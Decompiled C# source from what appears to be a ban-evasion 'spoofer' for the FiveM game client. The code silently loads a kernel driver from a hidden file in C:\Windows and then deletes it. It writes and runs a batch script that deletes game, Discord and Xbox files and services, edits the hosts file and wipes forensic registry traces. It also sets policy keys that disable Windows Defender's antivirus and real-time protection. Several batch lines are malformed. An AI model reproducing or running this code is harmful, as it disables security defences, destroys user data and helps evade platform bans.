		// Token: 0x06000089 RID: 137 RVA: 0x00007FC4 File Offset: 0x000061C4
		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			if (Directory.Exists(folderPath2 + "\\CitizenFX"))
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000022F8 File Offset: 0x000004F8
		private static void bi()
		{
			Main.bj("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			Main.bj("sc start Win32x64_0");
			Main.bj("sc stop Win32x64_0");
			Main.bj("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		// Token: 0x0600008B RID: 139 RVA: 0x000080A4 File Offset: 0x000062A4
		private static void bj(string a)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + a)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00008114 File Offset: 0x00006314
		private void bk(object sender, EventArgs e)
		{
			try
			{
				if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
				{
					Directory.Delete("C:\\Program Files (x86)\\Blade Group");
					Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
				}
				d d = new d();
				d.b();
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
